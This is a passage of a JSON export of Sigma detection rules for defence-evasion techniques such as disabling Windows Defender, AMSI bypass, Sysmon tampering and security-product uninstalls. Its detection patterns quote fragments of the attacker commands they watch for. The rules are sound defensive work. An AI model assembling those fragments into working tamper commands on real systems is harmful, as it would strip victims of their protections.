                    "07e3cb2c-0608-410d-be4b-1511cb1a0448",
                    "f2485272-a156-4773-82d7-1d178bc4905b",
                    "bc92ca75-cd42-4d61-9a37-9d5aa259c88b",
                    "99c4658d-2c5e-4d87-828d-7c066ca537c3",
                    "bf9e1387-b040-4393-9851-1598f8ecfae9",
                    "4916a35e-bfc4-47d0-8e25-a003d7067061",
                    "9f4662ac-17ca-43aa-8f12-5d7b989d0101",
                    "30edb182-aa75-42c0-b0a9-e998bb29067c",
                    "05b2aa93-1210-42c8-8d9a-2fcc13b284f5",
                    "452bce90-6fb0-43cc-97a5-affc283139b3",
                    "e1aa95de-610a-427d-b9e7-9b46cfafbe6a",
                    "fc0e89b5-adb0-43c1-b749-c12a10ec37de",
                    "c6fb44c6-71f5-49e6-9462-1425d328aee3",
                    "a34f79a3-8e5f-4cc3-b765-de00695452c2",
                    "f0f7be61-9cf5-43be-9836-99d6ef448a18",
                    "4db60cc0-36fb-42b7-9b58-a5b53019fb74",
                    "4f927692-68b5-4267-871b-073c45f4f6fe",
                    "3da70954-0f2c-4103-adff-b7440368f50e",
                    "6c82cf5c-090d-4d57-9188-533577631108",
                    "801bd44f-ceed-4eb6-887c-11544633c0aa",
                    "f6de9536-0441-4b3f-a646-f4e00f300ffd",
                    "8ffc5407-52e3-478f-9596-0a7371eafe13",
                    "14c71865-6cd3-44ae-adaa-1db923fae5f2",
                    "f63508a0-c809-4435-b3be-ed819394d612",
                    "e0d6c087-2d1c-47fd-8799-3904103c5a98",
                    "272e55a4-9e6b-4211-acb6-78f51f0b1b40",
                    "41d1058a-aea7-4952-9293-29eaaf516465",
                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
                    "93d298a1-d28f-47f1-a468-d971e7796679",
                    "ae2bdd58-0681-48ac-be7f-58ab4e593458",
                    "ec19ebab-72dc-40e1-9728-4c0b805d722c",
                    "17769c90-230e-488b-a463-e05c08e9d48f",
                    "d7662ff6-9e97-4596-a61d-9839e32dee8d",
                    "fb50eb7a-5ab1-43ae-bcc9-091818cb8424",
                    "5e95028c-5229-4214-afae-d653d573d0ec",
                    "0eb46774-f1ab-4a74-8238-1155855f2263",
                    "6e61ee20-ce00-4f8d-8aee-bedd8216f7e3",
                    "6c0a7755-6d31-44fa-80e1-133e57752680",
                    "92a974db-ab84-457f-9ec0-55db83d7a825",
                    "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
                    "225d8b09-e714-479c-a0e4-55e6f29adf35",
                    "91f6a16c-ef71-437a-99ac-0b070e3ad221",
                    "fcddca7c-b9c0-4ddf-98da-e1e2d18b0157",
                    "09706624-b7f6-455d-9d02-adee024cee1d",
                    "43e32da2-fdd0-4156-90de-50dfd62636f9",
                    "7c637634-c95d-4bbf-b26c-a82510874b34",
                    "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
                    "1ec65a5f-9473-4f12-97da-622044d6df21",
                    "a7ee1722-c3c5-aeff-3212-c777e4733217",
                    "48917adc-a28e-4f5d-b729-11e75da8941f",
                    "cd1f961e-0b96-436b-b7c6-38da4583ec00",
                    "fa2559c8-1197-471d-9cdd-05a0273d4522",
                    "9719a8aa-401c-41af-8108-ced7ec9cd75c",
                    "49e5bc24-8b86-49f1-b743-535f332c2856",
                    "7b544661-69fc-419f-9a59-82ccc328f205",
                    "07330162-dba1-4746-8121-a9647d49d297",
                    "847d5ff3-8a31-4737-a970-aeae8fe21765",
                    "f44800ac-38ec-471f-936e-3fa7d9c53100",
                    "a982fc9c-6333-4ffb-a51d-addb04e8b529",
                    "dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a",
                    "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
                    "7d995e63-ec83-4aa3-89d5-8a17b5c87c86",
                    "ac08589e-ee59-4935-8667-d845e38fe579",
                    "0372e1f9-0fd2-40f7-be1b-a7b2b848fa7b",
                    "6a5f68d1-c4b5-46b9-94ee-5324892ea939",
                    "42205c73-75c8-4a63-9db1-e3782e06fda0",
                    "1321dc4e-a1fe-481d-a016-52c45f0c8b4f",
                    "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
                    "160d2780-31f7-4922-8b3a-efce30e63e96",
                    "85c312b7-f44d-4a51-a024-d671c40b49fc",
                    "9e8f6035-88bf-4a63-96b6-b17c0508257e",
                    "a3ab73f1-bd46-4319-8f06-4b20d0617886",
                    "fe34868f-6e0e-4882-81f6-c43aa8f15b62",
                    "ff39f1a6-84ac-476f-a1af-37fcdf53d7c0",
                    "7fd4bb39-12d0-45ab-bb36-cebabc73dc7b",
                    "8dbeaaac-a671-4a02-8dab-5eec2a1c935b",
                    "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
                    "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
                    "4a6713f6-3331-11ed-a261-0242ac120002",
                    "6783aa9e-0dc3-49d4-a94a-8b39c5fd700b"
                ],
                "lookup_results": [
                    {
                        "uuid": "a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc",
                        "lookup_data": {
                            "description": "Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/01/21\ndescription: Detects commands that indicate a Raccine removal from an end system.\n  Raccine is a free ransomware protection tool.\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains|all:\n    - 'taskkill '\n    - RaccineSettings.exe\n  selection2:\n    CommandLine|contains|all:\n    - reg.exe\n    - delete\n    - Raccine Tray\n  selection3:\n    CommandLine|contains|all:\n    - schtasks\n    - /DELETE\n    - Raccine Rules Updater\nfalsepositives:\n- Legitimate deinstallation by administrative staff\nid: a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/Neo23x0/Raccine\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Raccine Uninstall\n",
                            "sigma:id": "a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc",
                            "title": "Raccine Uninstall",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "07e3cb2c-0608-410d-be4b-1511cb1a0448",
                        "lookup_data": {
                            "description": "Detects attempts to remove windows defender configuration using the 'MpPreference' cmdlet",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/05\ndescription: Detects attempts to remove windows defender configuration using the 'MpPreference'\n  cmdlet\ndetection:\n  condition: all of selection_*\n  selection_remove:\n    CommandLine|contains: Remove-MpPreference\n  selection_tamper:\n    CommandLine|contains:\n    - '-ControlledFolderAccessProtectedFolders '\n    - '-AttackSurfaceReductionRules_Ids '\n    - '-AttackSurfaceReductionRules_Actions '\n    - '-CheckForSignaturesBeforeRunningScan '\nfalsepositives:\n- Legitimate PowerShell scripts\nid: 07e3cb2c-0608-410d-be4b-1511cb1a0448\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088\nrelated:\n- id: ae2bdd58-0681-48ac-be7f-58ab4e593458\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Tamper Windows Defender Remove-MpPreference\n",
                            "sigma:id": "07e3cb2c-0608-410d-be4b-1511cb1a0448",
                            "title": "Tamper Windows Defender Remove-MpPreference",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f2485272-a156-4773-82d7-1d178bc4905b",
                        "lookup_data": {
                            "description": "Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n",
                            "raw": "author: xknow (@xknow_infosec), xorxes (@xor_xes)\ndate: 2019/04/08\ndescription: 'Detects installation of NalDrv or PROCEXP152 services via registry-keys\n  to non-system32 folders.\n\n  Both services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs),\n  which uses KDU (https://github.com/hfiref0x/KDU)\n\n  '\ndetection:\n  condition: selection and not filter\n  filter:\n    Details|contains: \\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS\n    Image|endswith:\n    - \\procexp64.exe\n    - \\procexp.exe\n    - \\procmon64.exe\n    - \\procmon.exe\n    - \\handle.exe\n    - \\handle64.exe\n  selection:\n    EventType: SetValue\n    TargetObject:\n    - HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath\n    - HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath\nfalsepositives:\n- Other legimate tools using this service names and drivers. Note - clever attackers\n  may easily bypass this detection by just renaming the services. Therefore just Medium-level\n  and don't rely on it.\nid: f2485272-a156-4773-82d7-1d178bc4905b\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/07\nreferences:\n- https://web.archive.org/web/20200419024230/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/\nstatus: test\ntags:\n- attack.t1562.001\n- attack.defense_evasion\ntitle: Suspicious Service Installed\n",
                            "sigma:id": "f2485272-a156-4773-82d7-1d178bc4905b",
                            "title": "Suspicious Service Installed",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bc92ca75-cd42-4d61-9a37-9d5aa259c88b",
                        "lookup_data": {
                            "description": "Detects the restoration of files from the defender quarantine",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/06\ndescription: Detects the restoration of files from the defender quarantine\ndetection:\n  condition: selection\n  selection:\n    EventID: 1009\nfalsepositives:\n- Legitimate administrator activity restoring a file\nid: bc92ca75-cd42-4d61-9a37-9d5aa259c88b\nlevel: high\nlogsource:\n  product: windows\n  service: windefend\nreferences:\n- https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Win Defender Restored Quarantine File\n",
                            "sigma:id": "bc92ca75-cd42-4d61-9a37-9d5aa259c88b",
                            "title": "Win Defender Restored Quarantine File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "99c4658d-2c5e-4d87-828d-7c066ca537c3",
                        "lookup_data": {
                            "description": "Detect built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool.\nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\n",
                            "raw": "author: frack113\ndate: 2022/09/10\ndescription: 'Detect built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment\n  Image Servicing and Management tool.\n\n  Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,\n  and update features and packages in Windows images\n\n  '\ndetection:\n  condition: all of selection*\n  selection_cmd:\n    ScriptBlockText|contains|all:\n    - Disable-WindowsOptionalFeature\n    - -Online\n    - -FeatureName\n  selection_feature:\n    ScriptBlockText|contains:\n    - Windows-Defender-Gui\n    - Windows-Defender-Features\n    - Windows-Defender\n    - Windows-Defender-ApplicationGuard\nfalsepositives:\n- Unknown\nid: 99c4658d-2c5e-4d87-828d-7c066ca537c3\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/5b67c9b141fa3918017f8fa44f2f88f0b1ecb9e1/atomics/T1562.001/T1562.001.md\n- https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable-WindowsOptionalFeature Command PowerShell\n",
                            "sigma:id": "99c4658d-2c5e-4d87-828d-7c066ca537c3",
                            "title": "Disable-WindowsOptionalFeature Command PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bf9e1387-b040-4393-9851-1598f8ecfae9",
                        "lookup_data": {
                            "description": "Detects disabling Windows Defender Exploit Guard Network Protection",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/08/04\ndescription: Detects disabling Windows Defender Exploit Guard Network Protection\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (00000001)\n    EventType: SetValue\n    TargetObject|contains: SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App\n      and Browser protection\\DisallowExploitProtectionOverride\nfalsepositives:\n- Unknown\nid: bf9e1387-b040-4393-9851-1598f8ecfae9\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/08/05\nreferences:\n- https://www.tenforums.com/tutorials/105533-enable-disable-windows-defender-exploit-protection-settings.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Exploit Guard Network Protection on Windows Defender\n",
                            "sigma:id": "bf9e1387-b040-4393-9851-1598f8ecfae9",
                            "title": "Disable Exploit Guard Network Protection on Windows Defender",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4916a35e-bfc4-47d0-8e25-a003d7067061",
                        "lookup_data": {
                            "description": "Detects changes in Sysmon driver altitude. If the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot.",
                            "raw": "author: B.Talebi\ndate: 2022/07/28\ndescription: Detects changes in Sysmon driver altitude. If the Sysmon driver is configured\n  to load at an altitude of another registered service, it will fail to load at boot.\ndetection:\n  condition: selection\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: \\Instances\\Sysmon Instance\\Altitude\n    TargetObject|startswith: HKLM\\SYSTEM\\CurrentControlSet\\\nfalsepositives:\n- Legitimate driver altitude change to hide sysmon\nid: 4916a35e-bfc4-47d0-8e25-a003d7067061\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650\n- https://youtu.be/zSihR3lTf7g\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Sysmon Event Logging Via Registry\n",
                            "sigma:id": "4916a35e-bfc4-47d0-8e25-a003d7067061",
                            "title": "Disable Sysmon Event Logging Via Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9f4662ac-17ca-43aa-8f12-5d7b989d0101",
                        "lookup_data": {
                            "description": "Detects tamper attempts to sophos av functionality via registry key modification",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/02\ndescription: Detects tamper attempts to sophos av functionality via registry key modification\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains:\n    - \\Sophos Endpoint Defense\\TamperProtection\\Config\\SAVEnabled\n    - \\Sophos Endpoint Defense\\TamperProtection\\Config\\SEDEnabled\n    - \\Sophos\\SAVService\\TamperProtection\\Enabled\nfalsepositives:\n- Some FP may occure when the feature is disabled by the AV itself, you should always\n  investigate if the action was legitimate\nid: 9f4662ac-17ca-43aa-8f12-5d7b989d0101\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Tamper With Sophos AV Registry Keys\n",
                            "sigma:id": "9f4662ac-17ca-43aa-8f12-5d7b989d0101",
                            "title": "Tamper With Sophos AV Registry Keys",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "30edb182-aa75-42c0-b0a9-e998bb29067c",
                        "lookup_data": {
                            "description": "Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning",
                            "raw": "author: Markus Neis\ndate: 2018/08/17\ndescription: Detects Request to \"amsiInitFailed\" that can be used to disable AMSI\n  Scanning\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - System.Management.Automation.AmsiUtils\n    - amsiInitFailed\nfalsepositives:\n- Unlikely\nid: 30edb182-aa75-42c0-b0a9-e998bb29067c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/02\nreferences:\n- https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Powershell AMSI Bypass via .NET Reflection\n",
                            "sigma:id": "30edb182-aa75-42c0-b0a9-e998bb29067c",
                            "title": "Powershell AMSI Bypass via .NET Reflection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "05b2aa93-1210-42c8-8d9a-2fcc13b284f5",
                        "lookup_data": {
                            "description": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on services registry key. Often used by attacker to remove AV software services",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/01\ndescription: Detects execution of \"reg.exe\" commands with the \"delete\" flag on services\n  registry key. Often used by attacker to remove AV software services\ndetection:\n  condition: all of selection*\n  selection_delete:\n    CommandLine|contains: ' delete '\n  selection_img:\n  - Image|endswith: reg.exe\n  - OriginalFileName: reg.exe\n  selection_key:\n    CommandLine|contains: \\SYSTEM\\CurrentControlSet\\services\\\nfalsepositives:\n- Unlikely\nid: 05b2aa93-1210-42c8-8d9a-2fcc13b284f5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.virustotal.com/gui/file/2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Delete Services Via Reg Utility\n",
                            "sigma:id": "05b2aa93-1210-42c8-8d9a-2fcc13b284f5",
                            "title": "Delete Services Via Reg Utility",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "452bce90-6fb0-43cc-97a5-affc283139b3",
                        "lookup_data": {
                            "description": "Detects reg command lines that disable certain important features of Microsoft Defender",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/22\ndescription: Detects reg command lines that disable certain important features of\n  Microsoft Defender\ndetection:\n  condition: all of selection_root_* and 1 of selection_dword_*\n  selection_dword_0:\n    CommandLine|contains:\n    - Real-Time Protection\n    - TamperProtection\n    CommandLine|contains|all:\n    - ' add '\n    - ' /d 0'\n  selection_dword_1:\n    CommandLine|contains: Notification_Suppress\n    CommandLine|contains|all:\n    - ' add '\n    - ' /d 1'\n  selection_root_img:\n  - Image|endswith: \\reg.exe\n  - OriginalFileName: reg.exe\n  selection_root_path:\n    CommandLine|contains:\n    - SOFTWARE\\Microsoft\\Windows Defender\\\n    - SOFTWARE\\Policies\\Microsoft\\Windows Defender\\\nfalsepositives:\n- Rare legitimate use by administrators to test software (should always be investigated)\nid: 452bce90-6fb0-43cc-97a5-affc283139b3\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\n- https://github.com/swagkarna/Defeat-Defender-V1.2.0\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Registry Defender Tampering\n",
                            "sigma:id": "452bce90-6fb0-43cc-97a5-affc283139b3",
                            "title": "Registry Defender Tampering",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e1aa95de-610a-427d-b9e7-9b46cfafbe6a",
                        "lookup_data": {
                            "description": "Detects when an attacker or tool disables the  Windows Defender service (WinDefend) via the registry",
                            "raw": "author: \"J\\xE1n Tren\\u010Dansk\\xFD, frack113, AlertIQ, Nasreddine Bencherchali\"\ndate: 2022/08/01\ndescription: Detects when an attacker or tool disables the  Windows Defender service\n  (WinDefend) via the registry\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000004)\n    EventType: SetValue\n    TargetObject: HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\\Start\nfalsepositives:\n- Administrator actions\nid: e1aa95de-610a-427d-b9e7-9b46cfafbe6a\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n- https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Service Disabled\n",
                            "sigma:id": "e1aa95de-610a-427d-b9e7-9b46cfafbe6a",
                            "title": "Windows Defender Service Disabled",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fc0e89b5-adb0-43c1-b749-c12a10ec37de",
                        "lookup_data": {
                            "description": "Detects execution of \"reg.exe\" commands with the \"delete\" flag on safe boot registry keys. Often used by attacker to prevent safeboot execution of security products",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems), Tim Shelton\ndate: 2022/08/08\ndescription: Detects execution of \"reg.exe\" commands with the \"delete\" flag on safe\n  boot registry keys. Often used by attacker to prevent safeboot execution of security\n  products\ndetection:\n  condition: all of selection*\n  selection_delete:\n    CommandLine|contains|all:\n    - ' delete '\n    - \\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\n  selection_img:\n  - Image|endswith: reg.exe\n  - OriginalFileName: reg.exe\nfalsepositives:\n- Unlikely\nid: fc0e89b5-adb0-43c1-b749-c12a10ec37de\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nrelated:\n- id: d7662ff6-9e97-4596-a61d-9839e32dee8d\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Delete SafeBoot Keys Via Reg Utility\n",
                            "sigma:id": "fc0e89b5-adb0-43c1-b749-c12a10ec37de",
                            "title": "Delete SafeBoot Keys Via Reg Utility",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c6fb44c6-71f5-49e6-9462-1425d328aee3",
                        "lookup_data": {
                            "description": "Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/04\ndescription: Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries\n  to modifies or tamper with Windows Defender AV\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|base64offset|contains:\n    - 'Add-MpPreference '\n    - 'Set-MpPreference '\n    - 'add-mppreference '\n    - 'set-mppreference '\n  - CommandLine|contains:\n    - QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\n    - EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\n    - BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\n    - UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\n    - MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\n    - TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\n    - YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\n    - EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\n    - hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\n    - cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\n    - MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\n    - zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\nfalsepositives:\n- Possible Admin Activity\n- Other Cmdlets that may use the same parameters\nid: c6fb44c6-71f5-49e6-9462-1425d328aee3\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://twitter.com/AdamTheAnalyst/status/1483497517119590403\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Powershell Base64 Encoded MpPreference Cmdlet\n",
                            "sigma:id": "c6fb44c6-71f5-49e6-9462-1425d328aee3",
                            "title": "Powershell Base64 Encoded MpPreference Cmdlet",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a34f79a3-8e5f-4cc3-b765-de00695452c2",
                        "lookup_data": {
                            "description": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/11/29\ndescription: Detects the execution of the tool PowerTool which has the ability to\n  kill a process, delete its process file, unload drivers, and delete the driver files\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith:\n    - \\PowerTool.exe\n    - \\PowerTool64.exe\n  - OriginalFileName: PowerTool.exe\nfalsepositives:\n- Unlikely\nid: a34f79a3-8e5f-4cc3-b765-de00695452c2\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/\n- https://www.trendmicro.com/en_us/research/22/i/play-ransomware-s-attack-playbook-unmasks-it-as-another-hive-aff.html\n- https://twitter.com/gbti_sa/status/1249653895900602375?lang=en\n- https://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: PowerTool Execution\n",
                            "sigma:id": "a34f79a3-8e5f-4cc3-b765-de00695452c2",
                            "title": "PowerTool Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f0f7be61-9cf5-43be-9836-99d6ef448a18",
                        "lookup_data": {
                            "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon",
                            "raw": "author: frack113\ndate: 2021/07/12\ndescription: Adversaries may disable security tools to avoid possible detection of\n  their tools and activities by uninstalling Crowdstrike Falcon\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - \\WindowsSensor.exe\n    - ' /uninstall'\n    - ' /quiet'\nfalsepositives:\n- Uninstall by admin\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: f0f7be61-9cf5-43be-9836-99d6ef448a18\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Uninstall Crowdstrike Falcon\n",
                            "sigma:id": "f0f7be61-9cf5-43be-9836-99d6ef448a18",
                            "title": "Uninstall Crowdstrike Falcon",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4db60cc0-36fb-42b7-9b58-a5b53019fb74",
                        "lookup_data": {
                            "description": "Detects disabling, deleting and updating of a Trail",
                            "raw": "author: vitaliy0x1\ndate: 2020/01/21\ndescription: Detects disabling, deleting and updating of a Trail\ndetection:\n  condition: selection_source\n  selection_source:\n    eventName:\n    - StopLogging\n    - UpdateTrail\n    - DeleteTrail\n    eventSource: cloudtrail.amazonaws.com\nfalsepositives:\n- Valid change in a Trail\nid: 4db60cc0-36fb-42b7-9b58-a5b53019fb74\nlevel: medium\nlogsource:\n  product: aws\n  service: cloudtrail\nmodified: 2022/10/09\nreferences:\n- https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: AWS CloudTrail Important Change\n",
                            "sigma:id": "4db60cc0-36fb-42b7-9b58-a5b53019fb74",
                            "title": "AWS CloudTrail Important Change",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4f927692-68b5-4267-871b-073c45f4f6fe",
                        "lookup_data": {
                            "description": "Detects attempts to disable AMSI in the command line. It is possible to bypass AMSI by disabling it before loading the main payload.",
                            "raw": "author: '@Kostastsale'\ndate: 2022/11/04\ndescription: Detects attempts to disable AMSI in the command line. It is possible\n  to bypass AMSI by disabling it before loading the main payload.\ndetection:\n  condition: selection1\n  selection1:\n    CommandLine|contains|all:\n    - '[Ref].Assembly.GetType'\n    - SetValue($null,$true)\n    - NonPublic,Static\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\powershell_ise.exe\nfalsepositives:\n- Unknown\nid: 4f927692-68b5-4267-871b-073c45f4f6fe\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.execution\ntitle: PowerShell AMSI Bypass Pattern\n",
                            "sigma:id": "4f927692-68b5-4267-871b-073c45f4f6fe",
                            "title": "PowerShell AMSI Bypass Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3da70954-0f2c-4103-adff-b7440368f50e",
                        "lookup_data": {
                            "description": "Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder.\nThis driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\n",
